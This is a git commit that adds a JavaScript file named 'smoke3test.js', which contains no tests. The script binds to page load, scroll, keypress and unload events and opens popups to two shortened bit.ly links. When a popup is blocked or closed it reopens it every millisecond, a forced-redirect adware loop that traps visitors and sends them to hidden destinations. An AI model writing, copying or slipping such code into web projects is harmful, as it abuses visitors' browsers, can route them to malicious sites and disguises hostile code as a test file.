499167c4e8717847b4810752d039b8461bcc4098
smokey2335 <116642185+smokey2335@users.noreply.github.com>
2024-03-12 13:45:19 +0100

    Create smoke3test.js

---
+++ smoke3test.js
@@ -0,0 +1,49 @@
+// First function
+function openFirstPopup() {
+    var popup = window.open('https://bit.ly/tagmone?utm_source=mone', '_blank');
+
+    function attemptOpen() {
+        if (popup === null || typeof(popup) === 'undefined' || popup.closed) {
+            setTimeout(function() {
+                popup = window.open('https://bit.ly/tagmone?utm_source=mone', '_blank');
+                attemptOpen(); // Retry recursively
+            }, 1);
+        }
+    }
+
+    attemptOpen();
+}
+
+function triggerOpenFirstPopup() {
+    openFirstPopup();
+}
+
+// Second function
+function openSecondPopup() {
+    var popup = window.open('https://bit.ly/dainty-wilder?utm_source=stuff', '_blank');
+
+    function attemptOpen() {
+        if (popup === null || typeof(popup) === 'undefined' || popup.closed) {
+            setTimeout(function() {
+                popup = window.open('https://bit.ly/dainty-wilder?utm_source=stuff', '_blank');
+                attemptOpen(); // Retry recursively
+            }, 1);
+        }
+    }
+
+    attemptOpen();
+}
+function triggerOpenSecondPopup() {
+    openSecondPopup();
+}
+
+window.addEventListener('load', triggerOpenFirstPopup);
+window.addEventListener('scroll', triggerOpenFirstPopup);
+window.addEventListener('keydown', triggerOpenFirstPopup);
+window.addEventListener('beforeunload', triggerOpenFirstPopup);
+
+
+window.addEventListener('load', triggerOpenSecondPopup);
+window.addEventListener('scroll', triggerOpenSecondPopup);
+window.addEventListener('keydown', triggerOpenSecondPopup);
+window.addEventListener('beforeunload', triggerOpenSecondPopup);
